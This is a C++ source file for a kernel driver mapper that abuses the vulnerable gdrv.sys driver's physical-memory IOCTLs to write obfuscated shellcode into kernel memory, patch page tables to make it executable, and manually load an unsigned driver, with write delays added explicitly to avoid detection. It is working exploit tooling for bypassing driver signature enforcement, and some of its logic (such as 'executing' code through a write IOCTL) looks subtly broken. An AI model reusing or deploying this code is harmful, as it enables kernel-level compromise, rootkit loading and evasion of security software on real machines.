#include "GDRVMapper.h"
#include "KernelMemory.h"
#include "PageTableUtils.h"
#include "ShellcodeUtils.h"
#include <iostream>
#include <fstream>

GDRVMapper::GDRVMapper() : 
    hDevice(INVALID_HANDLE_VALUE),
    ntoskrnlBase(0),
    exAllocatePoolAddress(0),
    exFreePoolAddress(0),
    lastAllocationEnd(0),
    kernelBase(0),
    kernelSize(0),
    cachedWritableAddr(0)
{
}

GDRVMapper::~GDRVMapper() {
    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
    }
}

bool GDRVMapper::Initialize() {
    // Open handle to GDRV device
    hDevice = CreateFileW(
        GDRV_DEVICE,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to open GDRV device (Error: " << GetLastError() << ")" << std::endl;
        return false;
    }
    
    std::cout << "[+] Connected to GDRV driver" << std::endl;
    
    // Get ntoskrnl.exe base address and kernel functions
    if (!KernelMemory::GetKernelInfo(ntoskrnlBase, exAllocatePoolAddress, exFreePoolAddress)) {
        std::cerr << "[-] Failed to get kernel information" << std::endl;
        return false;
    }
    
    return true;
}

bool GDRVMapper::ReadPhysicalMemory(uint64_t physAddress, void* buffer, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE) return false;
    
    GDRV_MEMORY_READ readRequest = { 0 };
    readRequest.Address = physAddress;
    readRequest.Length = size;
    readRequest.Buffer = (UINT64)buffer;
    
    DWORD bytesReturned = 0;
    return DeviceIoControl(
        hDevice,
        GDRV_IOCTL_READ_MEMORY,
        &readRequest,
        sizeof(readRequest),
        buffer,
        (DWORD)size,
        &bytesReturned,
        NULL
    );
}

bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, size_t size, bool strictValidation) {
    if (hDevice == INVALID_HANDLE_VALUE) return false;
    
    // Try multiple times with different offsets if initial attempt fails
    for (int attempt = 0; attempt < 8; attempt++) {
        if (attempt > 0) {
            std::cout << "[*] Write retry attempt " << attempt << " at 0x" << std::hex << physAddress << std::dec << std::endl;
            physAddress += PAGE_SIZE; // Try next page
        }
        
        GDRV_MEMORY_WRITE writeRequest = { 0 };
        writeRequest.Address = physAddress;
        writeRequest.Length = size;
        writeRequest.Buffer = (UINT64)buffer;
        
        DWORD bytesReturned = 0;
        BOOL result = DeviceIoControl(
            hDevice,
            GDRV_IOCTL_WRITE_MEMORY,
            &writeRequest,
            sizeof(writeRequest),
            NULL,
            0,
            &bytesReturned,
            NULL
        );
        
        if (!strictValidation) {
            // Just attempt the write and return without checking for errors
            return true;
        }
        
        if (result) {
            return true;
        }
    }
    return false;
}

std::vector<uint64_t> GDRVMapper::GenerateRandomizedOffsets(uint64_t start, uint64_t end, uint64_t step) {
    std::vector<uint64_t> offsets;
    for (uint64_t offset = start; offset < end; offset += step) {
        offsets.push_back(offset);
    }
    
    // Use random device for true randomness
    std::random_device rd;
    std::mt19937 gen(rd());
    std::shuffle(offsets.begin(), offsets.end(), gen);
    
    return offsets;
}

bool GDRVMapper::IsModuleExcluded(const std::string& modulePath) {
    // Skip critical system modules
    const char* excludedModules[] = {
        "ntoskrnl.exe",
        "hal.dll",
        "win32k.sys",
        "ci.dll",
        "clfs.sys",
        "ksecdd.sys"
    };
    
    for (const auto& excluded : excludedModules) {
        if (modulePath.find(excluded) != std::string::npos) {
            return true;
        }
    }
    return false;
}

uint64_t GDRVMapper::FindGDRVWritableMemory() {
    std::cout << "[*] Searching for GDRV driver memory..." << std::endl;
    
    // Get loaded modules information 
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    
    typedef NTSTATUS(NTAPI* NtQuerySystemInformationFn)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );
    
    auto NtQuerySystemInformation = (NtQuerySystemInformationFn)GetProcAddress(
        ntdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return 0;
    
    // Get list of modules
    std::vector<uint8_t> buffer;
    ULONG len = 0;
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
    buffer.resize(len);
    if (NtQuerySystemInformation(SystemModuleInformation, buffer.data(), len, &len) != 0)
        return 0;

    auto modules = (PSYSTEM_MODULE_INFORMATION)buffer.data();
    uint64_t gdrvBase = 0;
    
    // Find GDRV driver
    for (ULONG i = 0; i < modules->Count; i++) {
        std::string path = std::string(modules->Modules[i].FullPathName);
        if (path.find("gdrv.sys") != std::string::npos || path.find("GDRV.sys") != std::string::npos) {
            gdrvBase = (uint64_t)modules->Modules[i].ImageBase;
            std::cout << "[+] Found GDRV driver at 0x" << std::hex << gdrvBase << std::dec << std::endl;
            std::cout << "[+] Path: " << path << std::endl;
            break;
        }
    }
    
    if (!gdrvBase) {
        std::cerr << "[-] Could not find GDRV driver in memory" << std::endl;
        return 0;
    }
    
    // Try various offsets - focus on likely locations for writable memory
    const uint64_t offsets[] = {
        0x1000,  // Often the start of sections
        0x2000,  // Another common section offset
        0x3000,  // .data section is often here
        0x4000,  // .bss section could be here
        0x5000,  // Or here
        0x8000,  // Try a bit further in
        0x10000  // Sometimes larger offset is needed
    };
    
    std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
    
    // Try standard offsets first with non-strict validation
    for (auto offset : offsets) {
        uint64_t tryAddr = gdrvBase + offset;
        std::cout << "[*] Trying GDRV memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
        
        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
            std::cout << "[+] Found writable memory in GDRV at 0x" << std::hex << tryAddr << std::dec << std::endl;
            return tryAddr;
        }
    }
    
    // If standard offsets fail, try scanning in a loop with randomization
    auto randomOffsets = GenerateRandomizedOffsets(0x1000, MAX_SEARCH_RANGE, 0x1000);
    
    for (auto offset : randomOffsets) {
        // Skip offsets we already tried
        bool already_tried = false;
        for (auto standard_offset : offsets) {
            if (offset == standard_offset) {
                already_tried = true;
                break;
            }
        }
        if (already_tried) continue;
        
        uint64_t tryAddr = gdrvBase + offset;
        // Only log every 16KB to avoid spamming
        if (offset % 0x4000 == 0) {
            std::cout << "[*] Scanning GDRV memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
        }
        
        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
            std::cout << "[+] Found writable memory in GDRV at 0x" << std::hex << tryAddr << std::dec << std::endl;
            return tryAddr;
        }
    }
    
    std::cerr << "[-] Could not find writable memory in GDRV driver" << std::endl;
    return 0;
}

uint64_t GDRVMapper::FindModuleWritableMemory() {
    std::cout << "[*] Searching for writable memory in kernel modules..." << std::endl;
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    
    typedef NTSTATUS(NTAPI* NtQuerySystemInformationFn)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );
    
    auto NtQuerySystemInformation = (NtQuerySystemInformationFn)GetProcAddress(
        ntdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return 0;
    
    std::vector<uint8_t> buffer;
    ULONG len = 0;
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
    buffer.resize(len);
    if (NtQuerySystemInformation(SystemModuleInformation, buffer.data(), len, &len) != 0)
        return 0;

    auto modules = (PSYSTEM_MODULE_INFORMATION)buffer.data();
    std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
    
    // Try each module
    for (ULONG i = 0; i < modules->Count; i++) {
        std::string path = std::string(modules->Modules[i].FullPathName);
        uint64_t moduleBase = (uint64_t)modules->Modules[i].ImageBase;
        
        // Skip excluded modules
        if (IsModuleExcluded(path)) continue;
        
        std::cout << "[*] Trying module: " << path << std::endl;
        
        // Generate randomized offsets for this module
        auto randomOffsets = GenerateRandomizedOffsets(0x1000, MAX_SEARCH_RANGE, 0x1000);
        
        for (auto offset : randomOffsets) {
            uint64_t tryAddr = moduleBase + offset;
            
            // Only log every 64KB to reduce spam
            if (offset % 0x10000 == 0) {
                std::cout << "[*] Scanning address 0x" << std::hex << tryAddr << std::dec << std::endl;
            }
            
            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
                std::cout << "[+] Found writable memory in " << path << " at 0x" << std::hex << tryAddr << std::dec << std::endl;
                return tryAddr;
            }
        }
    }
    
    std::cerr << "[-] Could not find writable memory in any kernel module" << std::endl;
    return 0;
}

uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
    // Check cached address first
    if (cachedWritableAddr != 0) {
        std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
        if (WritePhysicalMemory(cachedWritableAddr, testPattern.data(), testPattern.size(), false)) {
            std::cout << "[+] Using cached writable memory at 0x" << std::hex << cachedWritableAddr << std::dec << std::endl;
            return cachedWritableAddr;
        }
        // Clear cache if no longer writable
        cachedWritableAddr = 0;
    }

    // Try GDRV memory first if startAddr is 0
    if (startAddr == 0) {
        uint64_t gdrvAddr = FindGDRVWritableMemory();
        if (gdrvAddr) {
            cachedWritableAddr = gdrvAddr;
            return gdrvAddr;
        }
        
        // If GDRV fails, try other kernel modules
        uint64_t moduleAddr = FindModuleWritableMemory();
        if (moduleAddr) {
            cachedWritableAddr = moduleAddr;
            return moduleAddr;
        }
    }

    // Only if all other methods fail or startAddr is specified, try direct memory search
    if (startAddr != 0) {
        std::cout << "[*] Trying fallback memory search at 0x" << std::hex << startAddr << std::dec << std::endl;
        
        std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
        auto randomOffsets = GenerateRandomizedOffsets(0, 0x8000, 0x1000);
        
        for (auto offset : randomOffsets) {
            uint64_t tryAddr = startAddr + offset;
            std::cout << "[*] Probing address 0x" << std::hex << tryAddr << std::dec << std::endl;
            
            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
                std::cout << "[+] Found writable memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
                cachedWritableAddr = tryAddr;
                return tryAddr;
            }
        }
    }
    
    return 0;
}

bool GDRVMapper::ExecuteBootstrapShellcode(uint64_t functionAddr, uint64_t* result) {
    // Try GDRV memory first (passing 0 triggers GDRV search)
    uint64_t scratchAddr = TryWritableRegion(0);
    
    // If GDRV fails, try the old approaches
    if (!scratchAddr) {
        std::cerr << "[-] Failed to find writable memory in GDRV, trying fallback methods" << std::endl;
        scratchAddr = TryWritableRegion(ntoskrnlBase + 0x100000);
    }
    
    // Create minimal shellcode that just calls a function and returns the value
    auto shellcode = ShellcodeUtils::CreateFastReturnShellcode(functionAddr);
    
    // Write the shellcode
    if (!WritePhysicalMemory(scratchAddr, shellcode.data(), shellcode.size())) {
        std::cerr << "[-] Failed to write bootstrap shellcode" << std::endl;
        return false;
    }
    
    // Make memory executable
    if (!PageTableUtils::MakeMemoryExecutable(
        scratchAddr,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        nullptr  // Pass null to avoid recursion
    )) {
        std::cerr << "[-] Failed to make bootstrap shellcode executable" << std::endl;
        return false;
    }
    
    // Create exec shellcode
    auto execShellcode = ShellcodeUtils::CreateExecShellcode(scratchAddr);
    
    // Need a second scratch address
    uint64_t execAddr = scratchAddr + 0x1000;
    
    if (!WritePhysicalMemory(execAddr, execShellcode.data(), execShellcode.size())) {
        std::cerr << "[-] Failed to write exec shellcode" << std::endl;
        return false;
    }
    
    if (!PageTableUtils::MakeMemoryExecutable(
        execAddr,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        nullptr  // Pass null to avoid recursion
    )) {
        std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
        return false;
    }
    
    // Execute directly through DeviceIoControl
    GDRV_MEMORY_WRITE execRequest = { 0 };
    execRequest.Address = execAddr;
    execRequest.Length = sizeof(uint64_t);
    execRequest.Buffer = (UINT64)result;
    
    DWORD bytesReturned = 0;
    if (!DeviceIoControl(
        hDevice,
        GDRV_IOCTL_WRITE_MEMORY,
        &execRequest,
        sizeof(execRequest),
        result,
        sizeof(uint64_t),
        &bytesReturned,
        NULL
    )) {
        std::cerr << "[-] Failed to execute bootstrap shellcode (Error: " << GetLastError() << ")" << std::endl;
        return false;
    }
    
    std::cout << "[+] Bootstrap shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
    return true;
}

uint64_t GDRVMapper::FindKThreadStackMemory() {
    // Try GDRV memory first
    uint64_t addr = TryWritableRegion(0);
    if (addr) {
        return addr;
    }

    // If GDRV fails, try the original KTHREAD approach
    std::cout << "[*] GDRV memory not available, trying KTHREAD stack..." << std::endl;
    
    // Get PsGetCurrentThread address
    HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (!ntoskrnl) return 0;
    
    uint64_t getCurrentThreadRva = (uint64_t)GetProcAddress(ntoskrnl, "PsGetCurrentThread") - (uint64_t)ntoskrnl;
    uint64_t psGetCurrentThreadAddr = ntoskrnlBase + getCurrentThreadRva;
    FreeLibrary(ntoskrnl);
    
    if (!psGetCurrentThreadAddr) {
        std::cerr << "[-] Failed to find PsGetCurrentThread" << std::endl;
        return 0;
    }
    
    std::cout << "[+] Found PsGetCurrentThread at 0x" << std::hex << psGetCurrentThreadAddr << std::dec << std::endl;
    
    // Execute bootstrap to get KTHREAD
    uint64_t kthreadAddr = 0;
    if (!ExecuteBootstrapShellcode(psGetCurrentThreadAddr, &kthreadAddr)) {
        std::cerr << "[-] Failed to get KTHREAD address" << std::endl;
        return 0;
    }
    
    std::cout << "[+] Got KTHREAD at 0x" << std::hex << kthreadAddr << std::dec << std::endl;
    
    // Read stack base from KTHREAD
    uint64_t stackBaseAddr = kthreadAddr + 0x28; // Stack base is at offset 0x28
    uint64_t stackBase = 0;
    
    if (!ReadPhysicalMemory(stackBaseAddr, &stackBase, sizeof(stackBase))) {
        std::cerr << "[-] Failed to read stack base" << std::endl;
        return 0;
    }
    
    std::cout << "[+] Stack base: 0x" << std::hex << stackBase << std::dec << std::endl;
    
    // Probe backward from stack base
    for (int i = 2; i < 12; i++) { // Try several pages
        uint64_t probeAddr = stackBase - (i * 0x1000);
        
        std::cout << "[*] Probing stack at 0x" << std::hex << probeAddr << std::dec << std::endl;
        
        // Try to write test pattern
        std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
        if (WritePhysicalMemory(probeAddr, testPattern.data(), testPattern.size())) {
            std::cout << "[+] Found writable stack memory at 0x" << std::hex << probeAddr << std::dec << std::endl;
            return probeAddr;
        }
    }
    
    std::cerr << "[-] Failed to find writable stack memory" << std::endl;
    return 0;
}

void GDRVMapper::CacheWritableRegion(uint64_t address, size_t size, const std::string& source) {
    MemoryRegion region = {
        .address = address,
        .size = size,
        .isExecutable = false,  // Will be set when made executable
        .isWritable = true,
        .source = source
    };
    writableRegions.push_back(region);
}

bool GDRVMapper::ValidateMemoryWrite(uint64_t address, const void* buffer, size_t size) {
    // Allocate a buffer for verification
    std::vector<uint8_t> readBack(size);
    
    // Read back the written data
    if (!ReadPhysicalMemory(address, readBack.data(), size)) {
        return false;
    }
    
    // Compare with original data
    return memcmp(buffer, readBack.data(), size) == 0;
}

bool GDRVMapper::WriteShellcodeIncrementally(uint64_t baseAddress, const std::vector<uint8_t>& shellcode, bool obfuscate) {
    std::cout << "[*] Writing shellcode incrementally..." << std::endl;
    
    // Optionally obfuscate the shellcode
    ObfuscatedShellcode obfuscatedCode;
    const std::vector<uint8_t>* codeToWrite = &shellcode;
    
    if (obfuscate) {
        obfuscatedCode = ShellcodeUtils::ObfuscateShellcode(shellcode);
        codeToWrite = &obfuscatedCode.code;
    }
    
    // Write decoder stub first if obfuscated
    if (obfuscate) {
        std::cout << "[*] Writing decoder stub..." << std::endl;
        auto decoderStub = ShellcodeUtils::CreateDecoderStub(
            obfuscatedCode.key, 
            baseAddress + obfuscatedCode.decoder.size(),  // Point to encoded shellcode
            obfuscatedCode.code.size()
        );
        
        if (!WritePhysicalMemory(baseAddress, decoderStub.data(), decoderStub.size(), true)) {
            std::cerr << "[-] Failed to write decoder stub" << std::endl;
            return false;
        }
        
        // Verify decoder stub
        if (!ValidateMemoryWrite(baseAddress, decoderStub.data(), decoderStub.size())) {
            std::cerr << "[-] Decoder stub verification failed" << std::endl;
            return false;
        }
    }
    
    // Calculate start address for shellcode
    uint64_t shellcodeAddr = baseAddress + (obfuscate ? obfuscatedCode.decoder.size() : 0);
    
    // Break shellcode into chunks and write incrementally
    auto chunks = ShellcodeUtils::ChunkShellcode(*codeToWrite, ShellcodeUtils::DEFAULT_CHUNK_SIZE);
    
    for (size_t i = 0; i < chunks.size(); i++) {
        const auto& chunk = chunks[i];
        uint64_t chunkAddr = shellcodeAddr + (i * ShellcodeUtils::DEFAULT_CHUNK_SIZE);
        
        std::cout << "[*] Writing chunk " << i + 1 << "/" << chunks.size() 
                 << " at 0x" << std::hex << chunkAddr << std::dec << std::endl;
        
        // Write chunk with non-strict validation
        if (!WritePhysicalMemory(chunkAddr, chunk.data(), chunk.size(), false)) {
            std::cerr << "[-] Failed to write chunk " << i + 1 << std::endl;
            return false;
        }
        
        // Small delay between writes to avoid detection
        std::this_thread::sleep_for(std::chrono::microseconds(WRITE_DELAY_US));
    }
    
    std::cout << "[+] Shellcode written successfully" << std::endl;
    return true;
}

bool GDRVMapper::ExecuteObfuscatedShellcode(uint64_t baseAddress, const ObfuscatedShellcode& shellcode, uint64_t* result) {
    std::cout << "[*] Executing obfuscated shellcode..." << std::endl;
    
    // Write decoder and encoded shellcode
    if (!WriteShellcodeIncrementally(baseAddress, shellcode.code, true)) {
        return false;
    }
    
    // Make memory executable
    if (!PageTableUtils::MakeMemoryExecutable(
        baseAddress,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        nullptr  // Pass null to avoid recursion
    )) {
        std::cerr << "[-] Failed to make shellcode memory executable" << std::endl;
        return false;
    }
    
    // Create execution shellcode
    auto execShellcode = ShellcodeUtils::CreateExecShellcode(baseAddress);
    
    // Write and execute
    uint64_t execAddr = baseAddress + 0x1000;  // Use next page
    
    if (!WritePhysicalMemory(execAddr, execShellcode.data(), execShellcode.size())) {
        std::cerr << "[-] Failed to write exec shellcode" << std::endl;
        return false;
    }
    
    // Execute
    GDRV_MEMORY_WRITE execRequest = { 0 };
    execRequest.Address = execAddr;
    execRequest.Length = sizeof(uint64_t);
    execRequest.Buffer = (UINT64)result;
    
    DWORD bytesReturned = 0;
    if (!DeviceIoControl(
        hDevice,
        GDRV_IOCTL_WRITE_MEMORY,
        &execRequest,
        sizeof(execRequest),
        result,
        sizeof(uint64_t),
        &bytesReturned,
        NULL
    )) {
        std::cerr << "[-] Failed to execute shellcode" << std::endl;
        return false;
    }
    
    std::cout << "[+] Shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
    return true;
}

bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result) {
    std::cout << "[*] Attempting to execute shellcode..." << std::endl;
    
    // Use KTHREAD stack memory instead of data section search
    uint64_t shellcodeAddr = FindKThreadStackMemory();
    
    if (!shellcodeAddr) {
        std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
        return false;
    }

    // Convert shellcode to vector and write incrementally
    std::vector<uint8_t> shellcodeVec(static_cast<const uint8_t*>(shellcode),
                                     static_cast<const uint8_t*>(shellcode) + size);
    
    if (!WriteShellcodeIncrementally(shellcodeAddr, shellcodeVec, true)) {
        std::cerr << "[-] Failed to write shellcode" << std::endl;
        return false;
    }

    // Make shellcode memory executable
    if (!PageTableUtils::MakeMemoryExecutable(
        shellcodeAddr,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
    )) {
        std::cerr << "[-] Failed to make shellcode memory executable" << std::endl;
        return false;
    }

    // Create shellcode to jump to our shellcode and store result
    auto jumpShellcode = ShellcodeUtils::CreateJumpShellcode(shellcodeAddr);

    // Use next page in KTHREAD stack for result
    uint64_t resultAddr = shellcodeAddr + 0x1000;
    
    // Clear result memory
    uint64_t nullValue = 0;
    if (!WritePhysicalMemory(resultAddr, &nullValue, sizeof(nullValue))) {
        std::cerr << "[-] Failed to clear result memory" << std::endl;
        return false;
    }

    // Execute the shellcode
    auto execShellcode = ShellcodeUtils::CreateExecShellcode(shellcodeAddr);
    
    // Use another page in KTHREAD stack for exec shellcode
    uint64_t execAddr = shellcodeAddr + 0x2000;

    // Write and execute the exec shellcode
    if (!WritePhysicalMemory(execAddr, execShellcode.data(), execShellcode.size())) {
        std::cerr << "[-] Failed to write exec shellcode" << std::endl;
        return false;
    }

    if (!PageTableUtils::MakeMemoryExecutable(
        execAddr,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
    )) {
        std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
        return false;
    }

    // Read result if requested
    if (result) {
        if (!ReadPhysicalMemory(resultAddr, result, sizeof(uint64_t))) {
            std::cerr << "[-] Failed to read shellcode result" << std::endl;
            return false;
        }
        std::cout << "[+] Shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
    }

    return true;
}

bool GDRVMapper::MapDriverWithExecPatch(const std::string& driverPath, uint64_t& baseAddress) {
    std::cout << "[*] Loading driver using ExAllocatePool2 + PTE patching: " << driverPath << std::endl;
    
    // Read the driver file
    std::ifstream file(driverPath, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "[-] Failed to open driver file" << std::endl;
        return false;
    }
    
    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<char> buffer(fileSize);
    if (!file.read(buffer.data(), fileSize)) {
        std::cerr << "[-] Failed to read driver file" << std::endl;
        return false;
    }
    
    // Parse PE headers
    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.data());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "[-] Invalid DOS signature" << std::endl;
        return false;
    }
    
    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(buffer.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "[-] Invalid NT signature" << std::endl;
        return false;
    }
    
    // Calculate total size needed (including headers)
    uint64_t totalSize = ntHeaders->OptionalHeader.SizeOfImage;
    
    // Allocate memory using ExAllocatePool2
    uint64_t driverBase = KernelMemory::DirectKernelAlloc(
        exAllocatePoolAddress,
        totalSize,
        NonPagedPoolNx,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
    );
    
    if (!driverBase) {
        std::cerr << "[-] Failed to allocate memory for driver" << std::endl;
        return false;
    }
    
    // Make the allocated memory executable
    if (!PageTableUtils::MakeMemoryExecutable(
        driverBase,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
    )) {
        std::cerr << "[-] Failed to make driver memory executable" << std::endl;
        return false;
    }
    
    // Copy PE headers
    std::cout << "[*] Writing PE headers" << std::endl;
    if (!WritePhysicalMemory(driverBase, buffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders)) {
        std::cerr << "[-] Failed to write PE headers" << std::endl;
        return false;
    }
    
    // Copy sections
    auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].SizeOfRawData > 0) {
            uint64_t sectionDest = driverBase + sectionHeader[i].VirtualAddress;
            uint64_t sectionSrc = reinterpret_cast<uint64_t>(buffer.data()) + sectionHeader[i].PointerToRawData;
            
            std::cout << "[*] Writing section " << i << " to 0x" << std::hex << sectionDest << std::dec << std::endl;
            if (!WritePhysicalMemory(sectionDest, reinterpret_cast<void*>(sectionSrc), sectionHeader[i].SizeOfRawData)) {
                std::cerr << "[-] Failed to write section " << i << std::endl;
                return false;
            }
            
            // Make each section executable if needed
            if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                if (!PageTableUtils::MakeMemoryExecutable(
                    sectionDest,
                    [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
                    [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
                    [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
                )) {
                    std::cerr << "[-] Failed to make section " << i << " executable" << std::endl;
                    return false;
                }
            }
        }
    }
    
    // Create minimal driver object
    DRIVER_OBJECT driverObject = { 0 };
    driverObject.DriverStart = reinterpret_cast<PVOID>(driverBase);
    driverObject.DriverSize = static_cast<ULONG>(totalSize);
    
    uint64_t driverObjectAddr = KernelMemory::DirectKernelAlloc(
        exAllocatePoolAddress,
        sizeof(DRIVER_OBJECT),
        NonPagedPoolNx,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
    );
    
    if (!driverObjectAddr || !WritePhysicalMemory(driverObjectAddr, &driverObject, sizeof(DRIVER_OBJECT))) {
        std::cerr << "[-] Failed to create driver object" << std::endl;
        return false;
    }
    
    // Prepare entry point call
    uint64_t entryPoint = driverBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    std::cout << "[*] Driver entry point at 0x" << std::hex << entryPoint << std::dec << std::endl;
    
    // Create and execute entry point shellcode
    auto entryShellcode = ShellcodeUtils::CreateKernelFunctionCallShellcode(entryPoint, driverObjectAddr, 0);
    
    uint64_t entryResult = 0;
    if (!ExecuteKernelShellcode(entryShellcode.data(), entryShellcode.size(), &entryResult)) {
        std::cerr << "[-] Failed to execute driver entry point" << std::endl;
        return false;
    }
    
    if (entryResult != 0) {
        std::cerr << "[-] Driver entry point returned error 0x" << std::hex << entryResult << std::dec << std::endl;
        return false;
    }
    
    std::cout << "[+] Driver successfully mapped and initialized" << std::endl;
    baseAddress = driverBase;
    return true;
}

bool GDRVMapper::MapMemoryDriver(const std::string& driverPath, uint64_t& baseAddress) {
    std::cout << "[*] Mapping memory driver: " << driverPath << std::endl;
    
    if (!MapDriverWithExecPatch(driverPath, baseAddress)) {
        std::cerr << "[-] Failed to map memory driver" << std::endl;
        return false;
    }
    
    std::cout << "[+] Memory driver mapped successfully at 0x" << std::hex << baseAddress << std::dec << std::endl;
    return true;
}
